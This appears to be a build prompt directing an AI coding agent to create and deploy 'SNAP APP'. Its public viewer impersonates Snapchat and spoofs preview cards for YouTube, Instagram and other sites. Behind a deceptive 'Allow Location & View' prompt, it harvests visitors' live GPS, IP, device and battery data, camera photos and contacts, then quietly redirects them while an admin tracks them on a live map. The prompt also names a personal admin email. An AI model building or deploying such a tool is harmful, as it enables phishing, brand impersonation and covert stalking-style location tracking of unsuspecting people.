# PROMPT.md — SNAP APP MASTER ANTIGRAVITY BUILD PROMPT

You are the senior developer responsible for implementing this entire academic project: **SNAP APP**.

- **App Name**: **SNAP APP**
- **Brand Assets & Favicon**: Use the Snapchat SVG Ghost logo located at `public/LOGO.svg` and `public/favicon.svg` as the official favicon and brand logo across the app.
- **Native Front Side**: The public-facing link viewer (`/view/[slug]`) must be crafted to look and feel EXACTLY same-to-same like a native Snapchat shared link / snap viewer.

Read `AGENTS.md` first and obey it as the project-wide engineering contract.

## START HERE

Do not immediately start coding.

First:
1. Inspect the complete repository.
2. Detect the framework/package manager.
3. Inspect existing source, migrations and configuration.
4. Detect `.env.local` presence and available variable names without printing secret values.
5. Detect Supabase CLI/configuration.
6. Detect Git remote and available GitHub automation.
7. Detect Vercel configuration and available deployment automation.
8. Produce a concise implementation checklist.
9. Then begin implementation.

Do not ask the developer to manually perform work that can be done through the available local CLI/API/integration.

## CORE PRODUCT

Build a complete image-sharing and target URL bridge application.

Admin:
- authenticate
- upload image OR specify target destination URL (YouTube, TikTok, Instagram, Facebook, Snapchat, custom)
- auto-fetch / scrape OpenGraph metadata (title, description, thumbnail) from target URL
- set or override title, description, and preview image
- select granular permissions & telemetry per link (Location GPS, Device info & Battery %, Camera photo verification, Android Contact picker)
- configure expiration
- generate unique share link
- activate/deactivate
- delete
- access dedicated per-link tracking page (`/admin/links/[id]`) with map, session breakdown, and visitor telemetry
- monitor active location sessions globally on OpenStreetMap with 1-click Google Maps redirect

Visitor & Social Crawlers:
- social platforms (WhatsApp, Instagram, Facebook, Telegram, Twitter/X) scrape `/view/[slug]` endpoint and render rich preview cards matching the target content
- visitor opens `/view/[slug]`
- see native Snapchat-style web snap viewer or authentic target preview card
- if location is required, see native disclosure modal: "Allow Location & View / Continue"
- press "Allow Location & View Image / Continue"
- browser geolocation prompts
- upon successful permission, capture coordinates and create session in Supabase
- if target URL is configured: immediately redirect visitor to genuine target URL (`window.location.href = target_url`)
- if target URL is not configured: reveal image in full Snapchat story viewer
- active location updates may continue while session is active

## STACK

Use:
- Next.js
- TypeScript
- Tailwind
- Supabase
- PostgreSQL
- Supabase Storage
- Supabase Realtime
- Vercel
- OpenStreetMap (Leaflet / dark tiles, zero API key needed) with 1-click Google Maps external redirect

Prefer existing project dependencies when suitable.

Avoid unnecessary packages.

## ENV AUTOMATION

All required credentials are expected to be available in local `.env.local`.

Use them automatically where supported.

Rules:
- never print secret values;
- never commit `.env.local`;
- never hardcode credentials;
- update `.env.example` with names and acquisition links;
- use server-only secrets only on the server;
- validate configuration.

Token Acquisition Portals (referenced in `.env.example`):
- Supabase Project URL & API Keys: `https://supabase.com/dashboard/project/_/settings/api`
- Supabase Personal Access Token: `https://supabase.com/dashboard/account/tokens`
- GitHub Personal Access Token: `https://github.com/settings/tokens`
- Vercel Deployment Token: `https://vercel.com/account/tokens`

If a credential allows an operation through API/CLI, perform that operation yourself.

Examples:
- Supabase project inspection via API
- Storage bucket `snap-images` programmatic creation & policy setup
- Database migration & RLS permission verification via API
- Realtime publication on `location_updates` configuration
- GitHub push
- Vercel deployment
- Deployment verification

Never say "run this manually" or "paste SQL in dashboard" when an authenticated API/CLI can perform it.

If a required credential or API is genuinely unavailable, report it instead of pretending.

## SUPABASE MASTER-SCHEMA SYSTEM

Create:

`supabase/MASTER_SCHEMA.sql`

It must always contain the COMPLETE CURRENT database schema.

Create numbered/timestamped migration files normally.

After every migration:
1. apply migration;
2. verify it;
3. update MASTER_SCHEMA.sql;
4. compare master schema with the resulting database;
5. only then continue.

MASTER_SCHEMA is a canonical snapshot, NOT a migration.

Never rewrite historical migrations merely to make them match the master.

Include in MASTER_SCHEMA:
- extensions used by project
- enums
- tables
- columns
- defaults
- PKs
- FKs
- UNIQUE/CHECK constraints
- indexes
- functions
- triggers
- RLS
- policies
- grants relevant to application
- Realtime publication configuration when applicable

If schema drift is found:
STOP and reconcile it before implementing unrelated features.

## REQUIRED DATABASE

Implement:

### profiles
Admin/user profile information required by the application.

### image_links
- id
- slug
- image_path (nullable for pure redirect links)
- target_url (destination URL: YouTube, TikTok, Instagram, Facebook, custom)
- link_type ('image' | 'redirect' | 'hybrid')
- og_title (custom / scraped OpenGraph title)
- og_description (custom / scraped OpenGraph description)
- og_image_url (preview thumbnail URL for WhatsApp/Instagram cards)
- og_platform ('youtube' | 'instagram' | 'tiktok' | 'facebook' | 'snapchat' | 'custom')
- permissions_config (JSONB: location, device_info, camera, contacts)
- title
- description
- is_active
- requires_location
- expires_at
- created_at
- updated_at

### location_sessions
- id
- link_id
- consent_at
- started_at
- ended_at
- status
- ip_address
- user_agent
- device_info (JSONB: OS, browser, screen, battery %, timezone)
- permissions_granted (JSONB)
- captured_media_path (storage photo path)
- captured_data (JSONB)

### location_updates
- id
- session_id
- latitude
- longitude
- accuracy
- created_at

### admin_settings
Application-level settings required by admin.

Use UUIDs and appropriate relationships.

Add coordinate CHECK constraints.

Add indexes for slug/link/session/time queries.

## RLS DESIGN

Public visitor must not be able to read private location data.

Admin must be authenticated and authorized.

Use server-side controlled operations where necessary.

Never use a service-role key in client components.

Test RLS, do not assume it is correct.

## STORAGE & BUCKET PROVISIONING VIA API

Use Supabase Storage with dedicated bucket: `snap-images`.

Create/configure image storage through available Supabase API:
- Auto-create bucket `snap-images` via Storage API (`storage.createBucket('snap-images', { public: true, fileSizeLimit: 10485760, allowedMimeTypes: ['image/jpeg', 'image/png', 'image/webp', 'image/gif'] })`).
- Enable all necessary permissions via API/RLS:
  - Public Read access on `snap-images` so active image links load smoothly.
  - Authenticated admin / service-role access to upload, update, and delete images.

Validate uploads:
- MIME: `image/jpeg`, `image/png`, `image/webp`, `image/gif`
- extension matching MIME
- size limit: 10MB
- generated random UUID filename

Do not trust original filename.
Never expose service-role key to browser.
Use secure URLs/access patterns with fallback to signed URLs if needed.

## PUBLIC ROUTE (SNAP NATIVE VIEWER)

Implement:

`app/view/[slug]/page.tsx`

The public route must deliver an authentic Snapchat web viewing experience:
- Top bar with Snapchat SVG Ghost logo (`/LOGO.svg`), "SNAP APP" branding, and "Open in Snapchat" action pill
- Full-screen snap story viewport with rounded corners, top progress segments, timestamp, and mute/sound controls
- Snapchat-native bottom action bar with "Chat" reply pill, lens icon, and share button

Required states:
- loading (Snapchat ghost breathing animation)
- invalid link (Snapchat-styled not found state)
- expired (Snapchat-styled expired story notice)
- inactive (Snapchat-styled inactive link notice)
- permission required (Native Snapchat lens/camera styled permission modal with glowing yellow ring)
- requesting permission (Snapchat loading indicator)
- permission denied (Snapchat-styled permission blocked warning with retry button)
- location unavailable (Graceful failure card)
- success/image view (Full Snapchat story viewer)
- network error (Retryable error card)

When location is required:
- show Snapchat or social bridge disclosure modal;
- wait for explicit button click: "Allow Location & View / Continue";
- call browser Geolocation API;
- create session only after permission succeeds;
- store initial location securely in Supabase;
- if `target_url` is configured: immediately redirect to target URL (`window.location.href = target_url`) with fallback redirect button;
- if `target_url` is not set: reveal image in full Snapchat story mode.

Social OpenGraph Endpoint:
- `/view/[slug]` serves dynamic `<meta property="og:...">` tags matching target URL / custom metadata so WhatsApp, Instagram, Telegram, etc., render rich genuine cards.

Use watchPosition only after successful permission and only for the active page/session.

Clean up watcher on unmount/end.

## ADMIN UI & AUTHENTICATION

Admin access is strictly protected:
- Login route: `/admin/login` (email & password via Supabase Auth)
- Authorized email: strictly matching `ADMIN_EMAIL` in `.env.local` and in Vercel project settings (default: `shoaibzaynah@gmail.com`)
- Unauthorized sessions redirected to login

Implement:
- dashboard (`/admin`)
- images (`/admin/images`)
- links (`/admin/links`)
- live locations (`/admin/locations`)
- sessions (`/admin/sessions`)
- settings (`/admin/settings`)

## SHARED DESIGN SYSTEM & CODE REUSE (STRICT ANTI-VIBE-CODING)

Work like an elite engineering team:
- **No Vibe-Coding**: Strictly forbid one-off, ad-hoc, or inconsistent UI styles. Every single page and modal must speak the exact same native Snapchat design language.
- **Mandatory Shared UI Primitives (`components/ui/*`)**:
  - `Button.tsx`: Snapchat yellow primary (`#FFFC00`), dark obsidian pill, glass button.
  - `Card.tsx`: Obsidian dark glass surface with border `rgba(255,255,255,0.08)`.
  - `Modal.tsx`: Native Snapchat-styled blurred backdrop and bottom sheet / modal.
  - `Input.tsx`: Rounded Snapchat pill input controls.
  - `Badge.tsx`: Shared status pills (live, active, expired).
  - `Avatar.tsx`: Snapchat Bitmoji / user avatar with signature yellow halo.
- **Strict Code Reuse**:
  - Always check existing components, hooks, and utilities before creating anything new.
  - Never duplicate database queries or create "alag se" parallel functions.
  - Single source of truth for types (`types/index.ts`), Supabase clients (`lib/supabase/*`), and storage (`lib/storage.ts`).

Keep each file <=200 lines.

## LIVE MAP (OPENSTREETMAP + GOOGLE MAPS REDIRECT)

Create admin-only map view using OpenStreetMap (Leaflet / dark tiles, zero API keys required).

Display:
- active session
- latest location marker with accuracy circle
- update timestamp
- 1-click external redirect button to Google Maps (`https://www.google.com/maps?q=${lat},${lng}`) allowing the admin to view native Google Maps navigation on mobile or desktop without needing any Google API key!

Subscribe to Supabase Realtime only for authorized admin data.

Update markers without full page reload.

Do not expose location channels publicly.

## VISUAL DESIGN — NATIVE SNAPCHAT EXPERIENCE

Deliver a pixel-perfect, native Snapchat visual experience:
- **Official Logo & Favicon**: `public/LOGO.svg` and `public/favicon.svg` (Snapchat Ghost SVG)
- **Palette**: Signature Snapchat Yellow (`#FFFC00`), Obsidian Black (`#000000` / `#0a0a0c`), Pure White (`#FFFFFF`), Glass Overlay (`rgba(255,255,255,0.08)`)
- **Typography**: Clean, geometric sans-serif (Inter / system fonts) matching Snapchat mobile typography

Public viewer:
- dark full-screen media with rounded-2xl/3xl viewport
- top segmented progress indicators and creator avatar pill
- top Snapchat ghost logo branding pill
- smooth transitions & native feeling snap gestures
- authentic Snapchat permission modal with ghost icon and yellow CTA "Allow Location & View Image"
- responsive touch-friendly bottom action controls ("Chat" pill, lens, share)
- centered within an authentic mobile smartphone frame on desktop screens

Admin:
- clean dashboard
- responsive sidebar/navigation
- cards
- tables
- map
- loading/empty/error states

## MOBILE REQUIREMENTS

Test/optimize:
- iOS Safari
- Android Chrome
- Android Firefox where supported
- desktop browsers

Use:
- `100dvh`
- safe-area insets
- responsive typography
- touch targets
- overflow-safe layouts

Remember browser geolocation requires appropriate permissions and HTTPS in production.

## 200-LINE RULE

Every source/code/config file must be <=200 lines.

Split large files aggressively into:
- components
- hooks
- services
- validation
- utilities
- types

Do not minify or compress code to evade the rule.

## 360-DEGREE CHANGE AUDIT

Before finalizing any feature/change, inspect all affected:
- routes
- components
- hooks
- API/server handlers
- database tables
- RLS policies
- migrations
- MASTER_SCHEMA
- storage
- Realtime
- admin UI
- public UI
- tests
- documentation
- environment configuration
- deployment

Fix the whole dependency chain, not just one file.

## AUTOMATED WORKFLOW

When credentials/integrations exist:

### Supabase
- inspect;
- migrate;
- verify;
- update MASTER_SCHEMA;
- verify again.

### Git
- inspect status;
- review diff;
- commit logically;
- never include secrets;
- push through authenticated remote.

### Vercel
- trigger deployment;
- wait for result;
- inspect build logs/status;
- verify deployed application.

Do not force-push.

Do not fabricate deployment success.

## TESTING CHECKLIST

Run actual commands appropriate to the repository:
- install
- lint
- typecheck
- unit/integration tests if present
- production build

Functional checks:
- admin login
- upload
- storage
- link generation
- link copy
- expiry
- deactivation
- public view
- location disclosure
- permission granted
- permission denied
- location unavailable
- session creation
- location update validation
- Realtime
- admin map
- RLS isolation
- mobile layout

## IMPLEMENTATION STRATEGY

Work in small verified phases:

1. Audit
2. Architecture
3. Database
4. MASTER_SCHEMA
5. Auth/RLS
6. Storage
7. Admin
8. Links
9. Public viewer
10. Geolocation
11. Secure API
12. Realtime
13. Map
14. Security
15. Responsive QA
16. Build
17. Git push
18. Deployment
19. Production verification

After each phase:
- run relevant checks;
- fix errors;
- keep files under 200 lines;
- update documentation where needed.

## FINAL RESPONSE FROM AGENT

When finished, report:
- implemented features;
- important files;
- database migrations created;
- confirmation MASTER_SCHEMA is current;
- tests actually run and results;
- Git commit/push result;
- deployment result;
- production URL if available;
- any genuine remaining limitations.

Never expose credentials in the final report.
